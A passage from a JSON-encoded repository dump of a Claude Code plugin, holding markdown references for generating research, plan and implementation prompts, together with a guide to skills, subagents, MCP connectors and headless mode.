addresses\n\n## Context\nBuilding validation utilities for user registration\n\n## Requirements\n- Support standard email format\n- Return boolean result\n- Handle edge cases (empty, null)\n\n## Output\nCreate: `./src/utils/validate-email.ts`\n\n## Verification\n- Test with valid emails\n- Test with invalid formats\n- Test edge cases\n```\n\n### Complex Implementation\nMultiple artifacts:\n\n```markdown\n# Authentication System Implementation\n\n## Objective\nImplement JWT authentication with refresh tokens\n\n## Context\nResearch: @.prompts/001-auth-research/auth-research.md\nPlan: @.prompts/002-auth-plan/auth-plan.md\n\n## Requirements\n- JWT access tokens (15min expiry)\n- Refresh token rotation\n- httpOnly cookies\n- Rate limiting\n\n## Implementation\nFollow patterns from research:\n- Use jose library\n- Implement refresh rotation\n- Store refresh tokens hashed\n\nAvoid:\n- localStorage (XSS vulnerable)\n- Long-lived access tokens\n\n## Output\nCreate in `./src/auth/`:\n- `middleware.ts` - JWT validation\n- `routes.ts` - Auth endpoints\n- `types.ts` - Type definitions\n- `utils.ts` - Helper functions\n\nCreate in `./src/auth/__tests__/`:\n- `auth.test.ts` - Unit tests\n\n## Verification\n- Run: `npm test src/auth`\n- Type check: `npx tsc --noEmit`\n- Manual test: login flow\n- Security check: cookies, expiry\n```\n\n### Document Creation\n\n```markdown\n# API Documentation Creation\n\n## Objective\nCreate OpenAPI documentation for authentication endpoints\n\n## Context\nImplementation: @src/auth/routes.ts\n\n## Requirements\n- OpenAPI 3.0 spec\n- Request/response examples\n- Error codes\n- Authentication flow\n\n## Output\n- `./docs/api/auth.yaml` - OpenAPI spec\n- `./docs/guides/auth.md` - Integration guide\n\n## Verification\n- Validate OpenAPI: `npx @redocly/cli lint`\n- Check completeness\n- Verify examples\n```\n\n## Quality Checklist\n\nBefore completing:\n- [ ] All files created as specified\n- [ ] Tests pass\n- [ ] Type check clean\n- [ ] Follows research recommendations\n- [ ] SUMMARY.md created\n- [ ] Next step identified\n",
        "plugins/sys-cognition/skills/generating-prompts/references/execution-logic.md": "# Execution Engine Logic\n\n## Execution Modes\n\n### Single Prompt\nStraightforward execution of one prompt:\n1. Create folder: `.prompts/{number}-{topic}-{purpose}/`\n2. Write prompt to: `{number}-{topic}-{purpose}.md`\n3. Execute with Task agent\n4. Validate output\n5. Archive prompt\n\n### Sequential Execution\nFor chained prompts:\n1. Build execution queue from dependencies\n2. Execute each prompt in order\n3. Validate after each completion\n4. Stop on failure\n5. Report results\n\n### Parallel Execution\nFor independent prompts:\n1. Spawn all Task agents in single message\n2. Wait for completion\n3. Validate all outputs\n4. Report consolidated results\n\n## Chain Detection\nAutomatically detects dependencies:\n- Scans for existing `*-research.md` and `*-plan.md`\n- Matches by topic keyword\n- Suggests relevant files to reference\n- Determines execution order\n\n## Validation Logic\nAfter execution, verifies:\n- Output file created and not empty\n- Required XML metadata present\n- SUMMARY.md created with all sections\n- One-liner is substantive\n",
        "plugins/sys-cognition/skills/generating-prompts/references/metadata-guidelines.md": "# Metadata Guidelines\n\nStandard metadata structure for research and plan outputs.\n\n## Structure\n\n```xml\n### Metadata\n- **Confidence:** {high/medium/low} - {Why}\n- **Dependencies:** {What's needed}\n- **Open Questions:** {What remains uncertain}\n- **Assumptions:** {What was assumed}\n```\n\n## Confidence Levels\n\n- **High** - Official docs, verified patterns, clear consensus\n- **Medium** - Mixed sources, some gaps, reasonable approach\n- **Low** - Sparse docs, conflicting info, best guess\n\n## Examples\n\n### High Confidence\n\n```markdown\n### Metadata\n- **Confidence:** High - OWASP guidelines + multiple authoritative sources\n- **Dependencies:** Team familiarity with JWT concepts\n- **Open Questions:** Specific rate limits under production load\n- **Assumptions:** REST API architecture (not GraphQL)\n```\n\n### Medium Confidence\n\n```markdown\n### Metadata\n- **Confidence:** Medium - Library docs good, limited real-world benchmarks\n- **Dependencies:** npm packages available, Node.js environment\n- **Open Questions:** Performance with >100k concurrent users\n- **Assumptions:** Single region deployment\n```\n\n### Low Confidence\n\n```markdown\n### Metadata\n- **Confidence:** Low - Sparse documentation, conflicting community reports\n- **Dependencies:** Access to beta feature flags\n- **Open Questions:** Long-term maintenance status\n- **Assumptions:** Team can learn new patterns\n```\n\n## Usage\n\n**Research outputs:** Always include confidence, dependencies, open questions\n\n**Plan outputs:** Include confidence, dependencies, assumptions\n\n**Do outputs:** Typically omit metadata (focus on verification)\n",
        "plugins/sys-cognition/skills/generating-prompts/references/plan-patterns.md": "# Plan Patterns\n\nPrompt patterns for creating approaches and strategies.\n\n## Template\n\n```markdown\n# Plan: {Topic}\n\n## Objective\nCreate implementation plan for {topic}\n\n## Context\nResearch: @.prompts/{num}-{topic}-research/{topic}-research.md\n\n## Planning Requirements\n{What to address}\n{Constraints}\n{Success criteria}\n\n## Output\nSave to: .prompts/{num}-{topic}-plan/{topic}-plan.md\n\nStructure plan:\n\n### Summary\n{One paragraph overview}\n\n### Approach\n{Selected strategy with rationale}\n\n### Phases\n1. **Phase {n}: {Name}**\n   - Objective: {What accomplished}\n   - Tasks:\n     - [ ] {Task 1}\n     - [ ] {Task 2}\n   - Deliverables: {What's produced}\n   - Dependencies: {Requirements}\n\n2. **Phase {n}: {Name}**\n   - Objective: {What accomplished}\n   - Tasks:\n     - [ ] {Task 1}\n     - [ ] {Task 2}\n   - Deliverables: {What's produced}\n   - Dependencies: {Requirements}\n\n### Success Criteria\n- {Criterion 1}\n- {Criterion 2}\n\n### Risks & Mitigations\n| Risk | Mitigation |\n|------|------------|\n| {Risk} | {Response} |\n\n### Metadata\n- **Confidence:** {high/medium/low}\n- **Dependencies:** {External requirements}\n- **Assumptions:** {Context assumed}\n\n### Summary Requirements\nCreate .prompts/{num}-{topic}-plan/SUMMARY.md:\n\n```markdown\n# {Topic} Plan Summary\n\n**{Substantive one-liner describing approach}**\n\n## Phases\n1. **{Phase 1}** - {Objective}\n2. **{Phase 2}** - {Objective}\n3. **{Phase 3}** - {Objective}\n\n## Key Decisions\n- {Decision 1}\n- {Decision 2}\n\n## Next Step\n{Execute Phase 1 / proceed to implementation}\n```\n```\n\n## Plan Types\n\n### Implementation Roadmap\nBreaking down how to build something.\n\n**Example:** Authentication system\n\n```markdown\n## Objective\nCreate roadmap for implementing JWT authentication\n\n## Context\nResearch complete: @.prompts/001-auth-research/auth-research.md\n\n## Planning Requirements\n- Break into testable phases\n- Each phase builds on previous\n- Include testing at each step\n- Consider rollback points\n\n## Phases\n1. **Setup Infrastructure**\n   - Tasks: Create auth module, define types, set up tests\n   - Deliverables: Base structure, test framework\n   - Dependencies: None\n\n2. **Implement Core JWT**\n   - Tasks: Add token generation/validation, middleware\n   - Deliverables: Working JWT flow\n   - Dependencies: Phase 1\n\n3. **Add Refresh Logic**\n   - Tasks: Implement refresh tokens, rotation\n   - Deliverables: Secure session handling\n   - Dependencies: Phase 2\n```\n\n### Decision Framework\nChoosing between options.\n\n**Example:** Database selection\n\n```markdown\n## Objective\nCreate decision framework for database selection\n\n## Context\nResearch complete: @.prompts/001-database-research/database-research.md\n\n## Planning Requirements\nEvaluate: PostgreSQL, MongoDB, DynamoDB\nCriteria: Scalability, flexibility, cost, team expertise\n\n## Phases\n1. **Define Criteria**\n   - Tasks: Weight criteria by importance\n   - Deliverables: Scoring framework\n\n2. **Evaluate Options**\n   - Tasks: Score each database against criteria\n   - Deliverables: Comparison matrix\n\n3. **Make Recommendation**\n   - Tasks: Select option, document rationale\n   - Deliverables: Decision with justification\n```\n\n## Quality Checklist\n\nBefore completing plan:\n- [ ] Phases are logical and sequential\n- [ ] Tasks are specific and actionable\n- [ ] Dependencies are clear\n- [ ] Success criteria are measurable\n- [ ] SUMMARY.md created\n",
        "plugins/sys-cognition/skills/generating-prompts/references/question-bank.md": "# Question Bank\n\nContextual questions for intake, organized by purpose.\n\n## Universal Questions\n\n### Topic Identifier\nWhen topic not obvious:\n\n**Question:** What topic/feature is this for? (used for file naming)\n\nLet user provide via \"Other\" option. Enforce kebab-case.\n\n### Chain Reference\nWhen existing files found:\n\n**Question:** Should this prompt reference any existing research or plans?\n\nOptions: List found files + \"None\"\n\n## Do Questions\n\n### Artifact Type\n**Question:** What are you creating?\n\nOptions:\n- Code/feature - Software implementation\n- Document/content - Written material\n- Design/spec - Architecture, specifications\n\n### Scope\n**Question:** What level of completeness?\n\nOptions:\n- Production-ready - Ship to users\n- Working prototype - Functional\n- Proof of concept - Minimal demonstration\n\n### Testing\n**Question:** What testing is needed?\n\nOptions:\n- Full coverage - Unit, integration, e2e\n- Core functionality - Key paths tested\n- Manual verification - No automated tests\n\n## Plan Questions\n\n### Plan Purpose\n**Question:** What is this plan leading to?\n\nOptions:\n- Implementation - How to build\n- Decision - Weigh options, choose approach\n- Process - Define workflow\n\n### Format\n**Question:** What format works best?\n\nOptions:\n- Phased roadmap - Sequential stages\n- Checklist/tasks - Actionable items\n- Decision framework - Criteria, trade-offs\n\n## Research Questions\n\n### Depth\n**Question:** How deep should research go?\n\nOptions:\n- Overview - High-level understanding\n- Comprehensive - Detailed exploration\n- Exhaustive - Everything available\n\n### Sources\n**Question:** What sources to prioritize?\n\nOptions:\n- Official docs - Primary sources\n- Community - Real-world examples\n- Current/latest - 2024-2026 sources\n\n### Focus\n**Question:** What aspect is most important?\n\nOptions:\n- How it works - Concepts, internals\n- How to use it - Patterns, examples\n- Trade-offs - Pros/cons, alternatives\n",
        "plugins/sys-cognition/skills/generating-prompts/references/research-patterns.md": "# Research Patterns\n\nPrompt patterns for gathering information for planning or implementation.\n\n## Template\n\n```markdown\n# Research: {Topic}\n\n## Objective\nResearch {topic} to inform {purpose}\n\n## Context\n{Background and requirements}\n\n## Scope\nInclude:\n- {What to investigate}\n- {Specific questions}\n\nExclude:\n- {Out of scope}\n\nSources:\n- {Official documentation URLs}\n- {Search queries}\n\n## Output\nSave to: .prompts/{num}-{topic}-research/{topic}-research.md\n\nStructure findings:\n\n### Summary\n{2-3 paragraph overview}\n\n### Key Findings\n- {Finding 1} - {Source}\n- {Finding 2} - {Source}\n\n### Recommendations\n1. {Action} - {Why}\n2. {Action} - {Why}\n\n### Metadata\n- **Confidence:** {high/medium/low}\n- **Dependencies:** {What's needed}\n- **Open Questions:** {What remains}\n- **Sources:** {List consulted}\n\n### Summary Requirements\nCreate .prompts/{num}-{topic}-research/SUMMARY.md:\n\n```markdown\n# {Topic} Research Summary\n\n**{Substantive one-liner}**\n\n## Key Findings\n- {Finding 1}\n- {Finding 2}\n\n## Recommendations\n- {Action 1}\n- {Action 2}\n\n## Next Step\n{Create plan / proceed to implementation}\n```\n\n## Quality Checklist\n\nBefore completing research:\n- [ ] All scope questions answered\n- [ ] Sources verified and current\n- [ ] Findings actionable\n- [ ] Metadata complete\n- [ ] SUMMARY.md created\n\n## Research Types\n\n### Technology Research\n**Example:** JWT authentication libraries\n\n```markdown\n## Objective\nResearch JWT libraries for Node.js to select implementation library\n\n## Context\nBuilding authentication system for API-first application\n\n## Scope\nInclude:\n- Available libraries (jose, jsonwebtoken, etc.)\n- Security track record\n- Performance characteristics\n- TypeScript support\n- Maintenance status\n\nSources:\n- npm package pages\n- GitHub security advisories\n- Performance benchmarks\n```\n\n### Best Practices Research\n**Example:** Authentication security\n\n```markdown\n## Objective\nResearch authentication security best practices for implementation\n\n## Context\nImplementing user authentication for web application\n\n## Scope\nInclude:\n- OWASP guidelines\n- Token storage patterns\n- Common vulnerabilities\n- Secure configurations\n\nSources:\n- OWASP Authentication Cheat Sheet\n- Security best practices documentation\n```\n\n### API Research\n**Example:** Stripe payments\n\n```markdown\n## Objective\nResearch Stripe API for payment integration planning\n\n## Context\nAdding payment processing to SaaS application\n\n## Scope\nInclude:\n- API structure\n- Authentication methods\n- Key endpoints\n- Webhooks\n- Testing environment\n\nSources:\n- Stripe API documentation\n- Webhook guides\n- SDK references\n```\n",
        "plugins/sys-cognition/skills/generating-prompts/references/summary-template.md": "# Summary Template\n\nStandard SUMMARY.md structure for all prompt outputs.\n\n## Template\n\n```markdown\n# {Topic} {Purpose} Summary\n\n**{Substantive one-liner describing outcome}**\n\n## Key Findings\n- {Most important finding}\n- {Second key item}\n- {Third key item}\n\n## Files Created\n{Only for Do prompts}\n- `path/file.ext` - Description\n\n## Decisions Needed\n{Specific actionable decisions or \"None\"}\n\n## Next Step\n{Concrete forward action}\n```\n\n## Examples\n\n### Research Summary\n\n```markdown\n# Auth Research Summary\n\n**JWT with jose library and httpOnly cookies recommended**\n\n## Key Findings\n- jose outperforms jsonwebtoken in security and TypeScript support\n- httpOnly cookies required (localStorage XSS vulnerable)\n- Refresh rotation is OWASP standard\n\n## Decisions Needed\nNone - ready for planning\n\n## Next Step\nCreate auth-plan.md\n```\n\n### Plan Summary\n\n```markdown\n# Auth Plan Summary\n\n**4-phase implementation: setup  JWT core  refresh  tests**\n\n## Key Findings\n- Phased approach allows testing at each stage\n- Rate limiting critical for production\n- Phase 4 depends on successful Phase 3\n\n## Decisions Needed\nApprove 15-minute token expiry\n\n## Next Step\nExecute Phase 1 (setup infrastructure)\n```\n\n### Implementation Summary\n\n```markdown\n# Auth Implementation Summary\n\n**JWT middleware complete with 6 files created**\n\n## Files Created\n- `src/auth/middleware.ts` - JWT validation middleware\n- `src/auth/routes.ts` - Auth endpoints\n- `src/auth/types.ts` - Type definitions\n- `src/auth/utils.ts` - Helper functions\n- `src/auth/__tests__/auth.test.ts` - Unit tests\n\n## Verification\n- Tests: All passing\n- Type check: Clean\n- Manual test: Login flow working\n\n## Next Step\nRun full test suite and deploy\n```\n\n## Field Requirements\n\n### One-Liner\nMust be substantive - describes outcome, not status.\n\n**Good:** \"JWT with jose library recommended\"\n**Bad:** \"Research completed\"\n\n**Good:** \"4-phase implementation created\"\n**Bad:** \"Plan created\"\n\n### Key Findings\nPurpose-specific:\n- Research: Key recommendations\n- Plan: Phase breakdown\n- Do: What was implemented\n\n### Decisions Needed\nActionable items requiring user judgment:\n- Architectural choices\n- Trade-off confirmations\n- Assumption validation\n\nMust be specific: \"Approve 15-min expiry\" not \"review\"\n\n### Next Step\nConcrete action:\n- \"Create auth-plan.md\"\n- \"Execute Phase 1\"\n- \"Run tests\"\n\nNot vague: \"proceed to next phase\"\n",
        "plugins/sys-cognition/skills/generating-prompts/references/usage-workflow.md": "# Usage and Workflow\n\n## Quick Start\n1. **Intake** - Determine purpose (Do/Plan/Research/Refine)\n2. **Generate** - Create prompt using purpose-specific templates\n3. **Execute** - Run prompt with dependency-aware execution\n4. **Validate** - Verify output and create summary\n\n### Directory Structure\n```\n.prompts/\n 001-topic-research/\n    001-topic-research.md     # Prompt\n    topic-research.md         # Output\n    SUMMARY.md                # Human summary\n 002-topic-plan/\n    002-topic-plan.md\n    topic-plan.md\n    SUMMARY.md\n```\n\n## Usage Examples\n\n### Create Research Prompt\n```\n/create-meta-prompt research authentication options for the app\n```\n**What it does:**\n- Determines this is a Research task\n- Scans for existing research files to reference\n- Creates prompt with research-specific structure\n- Saves to `.prompts/{number}-{topic}-research/`\n- Executes with validation\n\n### Create Planning Prompt\n```\n/create-meta-prompt plan the auth implementation approach\n```\n**What it does:**\n- Detects existing auth-research.md\n- Asks if it should reference the research\n- Creates plan prompt with research context\n- Runs after research completes\n\n### Create Execution Prompt\n```\n/create-meta-prompt implement JWT authentication\n```\n**What it does:**\n- References both research and plan\n- Creates implementation prompt\n- Includes verification steps\n",
        "plugins/sys-cognition/skills/operating-claude/SKILL.md": "---\nname: operating-claude\ndescription: \"Operational manual for driving the Claude runtime. Use when needing to optimize context usage, troubleshoot performance, or understand runtime mechanics. Do not use for architectural definitions or building plugins.\"\nallowed-tools: [Read]\n---\n\n# Operational Mechanics\n\n## Runtime Operations\n\n### 1. Context Management\n- **Monitoring**: Check tokens via `/status` or observing response latency.\n- **Optimization**: Use `managing-context` for compression strategies.\n- **Degradation**: Performance drops >40% usage. Reset or fork session.\n\n### 2. Session Control\n- **Plan Mode**: Double `Shift+Tab` for high-reasoning tasks.\n- **Forking**: Isolate heavy tasks to avoid polluting main context.\n- **Checkpoints**: Use `_state.md` to persist progress across sessions.\n\n## Architecture References\n\nFor strict definitions of how the system is built, refer to the core documentation:\n\n- **Plugin Architecture**: `docs/guides/infrastructure.md`\n- **Skill Standards**: `docs/guides/skills.md`\n- **Engineering Patterns**: `docs/REFERENCES.md`\n",
        "plugins/sys-cognition/skills/operating-claude/references/advanced-features.md": "# Claude Code Advanced Features\n\n## 1. Skills: Teaching Claude Your Workflows\n\n### What Are Skills?\n\nSkills are markdown files that teach Claude how to do something specific to your work. When you ask Claude something that matches a skill's purpose, it automatically applies the skill.\n\n### Skill Structure\n\nCreate a folder with a `SKILL.md` file:\n\n```bash\n~/.claude/skills/your-skill-name/SKILL.md          # User-level\n.claude/skills/your-skill-name/SKILL.md           # Project-level\n```\n\n### SKILL.md Anatomy\n\nEvery `SKILL.md` starts with YAML frontmatter:\n\n```yaml\n---\nname: code-review-standards\ndescription: \"Apply our team's code review standards when reviewing PRs or suggesting improvements. Use when reviewing code, discussing best practices, or when the user asks for feedback on implementation.\"\n---\n```\n\nBelow the frontmatter, write markdown instructions:\n\n```yaml\n---\nname: commit-messages\ndescription: \"Generate commit messages following our team's conventions. Use when creating commits or when the user asks for help with commit messages.\"\n---\n\n# Commit Message Format\n\nAll commits follow conventional commits:\n- feat: new feature\n- fix: bug fix\n- refactor: code change that neither fixes nor adds\n- docs: documentation only\n- test: adding or updating tests\n\nFormat: `type(scope): description`\nExample: `feat(auth): add password reset flow`\n\nKeep the description under 50 characters.\n```\n\n### The Description: Your Skill's DNA\n\n**Critical**: Claude uses the `description` to decide when to apply the skill.\n\n**Be specific** about trigger conditions:\n```\n# Good\n\"Apply our team's code review standards when reviewing PRs or suggesting improvements. Use when reviewing code, discussing best practices, or when the user asks for feedback on implementation.\"\n\n# Bad\n\"Code review helper.\"\n```\n\n**You can also explicitly tell Claude**: \"Utilize the commit-messages skill\" and it will.\n\n### Progressive Disclosure Architecture\n\n**Key principle**: Claude pre-loads only the name and description (~100 tokens) at startup. The full instructions load only when Claude determines the skill is relevant.\n\n**Benefits**:\n- Dozens of skills available without bloating context\n- Efficient token usage\n- Automatic discovery\n\n### Where Skills Shine\n\nSkills aren't limited to code. Engineers build skills for:\n\n- Database query patterns specific to their schema\n- API documentation formats their company uses\n- Meeting notes templates\n- Personal workflows (meal planning, travel booking)\n\n**The pattern works** for anything where you repeatedly explain the same context or preferences to Claude.\n\n### Skill Examples by Domain\n\n#### Development Workflows\n```yaml\nname: feature-development\ndescription: \"Follow our feature development workflow from design to deployment. Use when starting a new feature or following our development process.\"\n```\n\n#### Code Standards\n```yaml\nname: typescript-standards\ndescription: \"Apply TypeScript strict mode standards and best practices. Use when writing, reviewing, or refactoring TypeScript code.\"\n```\n\n#### Documentation\n```yaml\nname: api-documentation\ndescription: \"Generate API documentation following OpenAPI 3.0 standards. Use when documenting endpoints or generating API specs.\"\n```\n\n### Advanced Skill Patterns\n\n#### 1. Routing Pattern\nSkills that guide Claude to other resources:\n\n```yaml\n---\nname: project-architecture\ndescription: \"Understand and navigate our project architecture. Use when asking about structure, file locations, or system design.\"\n---\n\n# Project Architecture Guide\n\nOur project follows a domain-driven structure:\n\n## Core Domains\n- **Auth**: User authentication and authorization\n- **Billing**: Payment processing and subscriptions\n- **API**: RESTful endpoints and GraphQL\n\n## Navigation\n- **Frontend**: `src/components/`, `src/pages/`\n- **Backend**: `src/routes/`, `src/services/`\n- **Database**: `prisma/schema.prisma`\n\nThese references illustrate the patternadapt them to your specific project structure.\n```\n\n#### 2. Checklist Pattern\nFor task-oriented skills:\n\n```yaml\n---\nname: release-checklist\ndescription: \"Execute our release checklist before deploying. Use when preparing a release or deploying code.\"\n---\n\n# Release Checklist\n\n## Pre-Deployment\n- [ ] All tests passing (`npm test`)\n- [ ] Type checking clean (`npm run type-check`)\n- [ ] Linting passes (`npm run lint`)\n- [ ] Build succeeds (`npm run build`)\n- [ ] Changelog updated\n- [ ] Version bumped\n\n## Deployment\n- [ ] Deploy to staging\n- [ ] Run smoke tests\n- [ ] Verify monitoring alerts\n- [ ] Deploy to production\n- [ ] Verify health checks\n\n## Post-Deployment\n- [ ] Check error rates\n- [ ] Verify metrics\n- [ ] Monitor for 1 hour\n- [ ] Announce in #releases\n```\n\n### Viewing Available Skills\n\nAsk Claude directly: \"What skills do you have available?\"\n\nOr navigate to: Settings  Capabilities  scroll down to see skills\n\n### Skill Best Practices\n\n1. **Keep descriptions specific** - Help Claude understand when to apply\n2. **Use progressive disclosure** - Core in SKILL.md, details in references/\n3. **Make skills self-contained** - Include all necessary resources\n4. **Update regularly** - Skills should evolve with your workflow\n5. **Test skills** - Use them in real scenarios to refine\n\n## 2. Subagents: Parallel Processing with Isolated Context\n\n### What Are Subagents?\n\nA subagent is a separate Claude instance with:\n- Its own context window (200K tokens)\n- Its own system prompt\n- Its own tool permissions\n- Isolated from the main conversation\n\n### Why Subagents Matter\n\n**Context degradation happens around 45%** of your context window. Subagents let you:\n- Offload complex tasks to fresh context\n- Keep your main conversation clean\n- Return only relevant summaries\n- Prevent context pollution\n\n### Built-in Subagents\n\nClaude Code includes three built-in subagents:\n\n#### 1. Explore\n- **Purpose**: Fast, read-only code analysis\n- **When to use**: Understanding code without making changes\n- **Specify thoroughness**: quick, medium, or very thorough\n\n#### 2. Plan\n- **Purpose**: Research and planning during plan mode\n- **When to use**: Gathering context before presenting a plan\n- **Returns**: Distilled findings for informed decisions\n\n#### 3. General-purpose\n- **Purpose**: Complex multi-step tasks\n- **When to use**: Tasks requiring both exploration and action\n- **Handles**: Multiple dependent steps and complex reasoning\n\n### Creating Custom Subagents\n\nAdd a markdown file to:\n- `~/.claude/agents/` (user-level, available in all projects)\n- `.claude/agents/` (project-level, shared with your team)\n\n### Custom Subagent Structure\n\n```yaml\n---\nname: security-reviewer\ndescription: \"Reviews code for security vulnerabilities. Invoke when checking for auth issues, injection risks, or data exposure.\"\ntools: Read, Grep, Glob\n---\n\nYou are a security-focused code reviewer. When analyzing code:\n\n1. Check for authentication and authorization gaps\n2. Look for injection vulnerabilities (SQL, command, XSS)\n3. Identify sensitive data exposure risks\n4. Flag insecure dependencies\n\nProvide specific file and line references for each finding. Categorize by severity: critical, high, medium, low.\n```\n\n### The Tools Field\n\nControls what the subagent can do:\n\n```yaml\n# Read-only reviewer\ntools: Read, Grep, Glob\n\n# Implementation agent\ntools: Read, Write, Edit, Bash\n\n# Research agent\ntools: Read, Grep, Glob, Bash\n```\n\n### How Subagents Communicate\n\n**Critical**: Subagents don't share context directly. Communication happens through delegation and return:\n\n```\nMain Agent\n   Identifies task suitable for delegation\n   Invokes subagent with specific prompt\n   Subagent executes in its own context\n   Subagent returns summary of findings\n   Main agent incorporates summary\n   Main agent continues\n```\n\n**The summary is key**: A well-designed subagent doesn't dump its entire context back.\n\n### Chaining Subagents\n\nFor complex workflows:\n\n```\nMain Agent\n   Delegates research to Explore\n      Returns: \"Found 3 relevant files: auth.py, middleware.py, routes.py\"\n   Delegates implementation to custom implementer\n      Returns: \"Added password reset endpoint, updated 2 files\"\n   Delegates testing to custom test-runner\n       Returns: \"All 12 tests passing, coverage at 94%\"\n```\n\nEach subagent gets fresh context for its task. The main agent holds summaries, not full exploration history.\n\n**Constraint**: Subagents cannot spawn other subagents (prevents infinite nesting).\n\n### Practical Subagent Patterns\n\n#### 1. Large Refactoring\n```\nMain Agent\n   Identifies all files needing changes\n   Spins up subagent for each logical group\n   Each subagent handles its scope\n   Returns summary of changes\n   Main agent never holds full context of all files\n```\n\n#### 2. Code Review Pipeline\n```\nParallel Subagents:\n   style-checker  Returns formatting issues\n   security-scanner  Returns security findings\n   test-coverage  Returns coverage analysis\n\nMain Agent\n   Synthesizes all findings\n   Produces comprehensive review\n```\n\n#### 3. Research Tasks\n```\nMain Agent\n   Delegates to Explore with specific questions\n   Returns distilled map of relevant files\n   Main context stays focused on implementation\n```\n\n### Custom Subagent Examples\n\n#### Security Reviewer\n```yaml\n---\nname: security-auditor\ndescription: \"Comprehensive security audit of code changes. Invoke when reviewing PRs, checking for vulnerabilities, or conducting security reviews.\"\ntools: Read, Grep, Glob, Bash\n---\n\n# Security Audit Protocol\n\nAnalyze code for:\n\n## Authentication & Authorization\n- Missing authentication checks\n- Privilege escalation risks\n- Session management issues\n\n## Input Validation\n- SQL injection vulnerabilities\n- XSS risks\n- Command injection\n- Path traversal\n\n## Data Protection\n- Sensitive data exposure\n- Insecure data storage\n- Encryption usage\n\nProvide findings with:\n- File and line references\n- Severity (critical, high, medium, low)\n- Remediation suggestions\n```\n\n#### Test Coverage Analyzer\n```yaml\n---\nname: coverage-analyzer\ndescription: \"Analyzes test coverage and identifies gaps. Invoke when checking test completeness or coverage requirements.\"\ntools: Read, Bash, Glob\n---\n\n# Coverage Analysis\n\n1. Run coverage report: `npm run test:coverage`\n2. Identify files with <80% coverage\n3. Find untested edge cases\n4. Suggest additional test cases\n\nReturn:\n- Coverage percentage by file\n- List of uncovered lines\n- Priority recommendations\n```\n\n### Subagent Best Practices\n\n1. **Design explicit output formats** - Summaries, not dumps\n2. **Scope subagent tasks narrowly** - One responsibility per subagent\n3. **Use appropriate tools** - Least privilege for safety\n4. **Document purpose clearly** - Help main agent know when to delegate\n5. **Test subagents independently** - Verify they work before orchestration\n\n## 3. MCP Connectors: Never Leave Claude\n\n### What Is MCP?\n\nModel Context Protocol (MCP) is a standardized way for AI models to call external tools and data sources through a unified interface.\n\n**Impact**: You don't go to GitHub, Slack, Gmail, Drive... Claude talks to all of them through MCP servers.\n\n### Adding MCP Connectors\n\n#### Via Command Line\n\n```bash\n# HTTP transport (recommended for remote servers)\nclaude mcp add --transport http <name> <url>\n\n# Example: Connect to Notion\nclaude mcp add --transport http notion https://mcp.notion.com/mcp\n\n# With authentication\nclaude mcp add --transport http github https://api.github.com/mcp \\\n  --header \"Authorization: Bearer your-token\"\n```\n\n#### Via Web Interface\n\nNavigate to: Settings  Connectors  find your server  configure  give permissions\n\n### MCP in Action: Real Examples\n\n#### Issue Tracker Integration\n```\nUser: \"Add the feature described in JIRA issue ENG-4521\"\nClaude: [Fetches issue via MCP]\n Implements feature based on requirements\n Updates ticket with PR link\n```\n\n#### Database Queries\n```\nUser: \"Find users who signed up in the last week from our PostgreSQL\"\nClaude: [Connects via MCP]\n Queries database directly\n Returns results\n```\n\n#### Design Integration\n```\nUser: \"Update our email template based on the new Figma designs\"\nClaude: [Fetches designs via MCP]\n Implements changes\n Uploads updated designs\n```\n\n#### Workflow Automation\n```\nUser: \"Create Gmail drafts inviting these users to a feedback session\"\nClaude: [Uses MCP to connect to Gmail]\n Sends personalized invitations\n Tracks responses\n```\n\n#### Slack Integration\n```\nUser: \"What did the team decide in the #engineering channel about the API redesign?\"\nClaude: [Searches Slack via MCP]\n Finds relevant threads\n Summarizes decisions\n```\n\n### The Compound Effect\n\n**Before MCP**: 5 context switches\n1. Check issue tracker\n2. Look at designs\n3. Review Slack discussion\n4. Implement code\n5. Update ticket\n\n**After MCP**: One continuous session\n- You're in flow state 24/7\n- No context switching\n- Integrated workflow\n\n### Recommended MCP Servers\n\n| Service | Purpose | Impact |\n|---------|---------|--------|\n| **GitHub** | Repository management, issues, PRs, code search | Complete dev workflow integration |\n| **Slack** | Channel history, thread summaries | Team communication context |\n| **Google Drive** | Document access | Reference materials in-context |\n| **PostgreSQL** | Direct database queries | Data without leaving Claude |\n| **Linear/Jira** | Issue tracking integration | Task management integration |\n\n### Creating Custom MCP Servers\n\nIf there's no MCP for your tool, you can create one:\n\n```javascript\n// Simple MCP server example\nimport { Server } from '@modelcontextprotocol/sdk/server/index.js';\n\nconst server = new Server(\n  {\n    name: 'my-custom-tool',\n    version: '1.0.0',\n  },\n  {\n    capabilities: {\n      tools: {},\n    },\n  }\n);\n\n// Define tools\nserver.setRequestHandler('tools/list', async () => {\n  return {\n    tools: [\n      {\n        name: 'my_action',\n        description: 'Does something useful',\n        inputSchema: {\n          type: 'object',\n          properties: {\n            param: {\n              type: 'string',\n              description: 'Parameter description',\n            },\n          },\n        },\n      },\n    ],\n  };\n});\n\nserver.setRequestHandler('tools/call', async (request) => {\n  const { name, arguments: args } = request.params;\n\n  if (name === 'my_action') {\n    // Implement your tool logic\n    return {\n      content: [\n        {\n          type: 'text',\n          text: 'Action completed successfully',\n        },\n      ],\n    };\n  }\n});\n```\n\n### MCP Security Considerations\n\n**Important**: Third-party MCP servers aren't verified by Anthropic.\n\n**Best practices**:\n- Review server source code for sensitive integrations\n- Use official connectors when available\n- Limit permissions to what's necessary\n- Monitor server activity\n\n### Viewing MCP Connections\n\nRun: `/mcp` in Claude Code\n\nOr check: Settings  Connectors\n\n### Advanced MCP Patterns\n\n#### 1. Connection Pooling\n```json\n{\n  \"mcpServers\": {\n    \"postgres\": {\n      \"command\": \"npx\",\n      \"args\": [\"-y\", \"@modelcontextprotocol/server-postgres\"],\n      \"env\": {\n        \"POSTGRES_URL\": \"${POSTGRES_URL}\",\n        \"MAX_CONNECTIONS\": \"10\"\n      }\n    }\n  }\n}\n```\n\n#### 2. Selective Tool Exposure\n```json\n{\n  \"mcpServers\": {\n    \"minimal-db\": {\n      \"command\": \"npx\",\n      \"args\": [\"-y\", \"@modelcontextprotocol/server-postgres\"],\n      \"env\": {\n        \"MCP_TOOLS\": \"query,schema\"\n      }\n    }\n  }\n}\n```\n\n#### 3. Lazy Loading\nOnly connect to MCP servers when needed:\n```\nUser: \"I need to query the database\"\n Claude connects to PostgreSQL MCP\n Performs query\n Disconnects when done\n```\n\n## 4. Building Systems (Beyond One-Off Tasks)\n\n### The Headless Mode\n\nClaude Code has a `-p` flag for headless mode:\n```bash\nclaude -p \"Your prompt here\"\n```\n\n**What it does**:\n- Runs your prompt without interactive interface\n- Outputs result and exits\n- Can be scripted and automated\n- 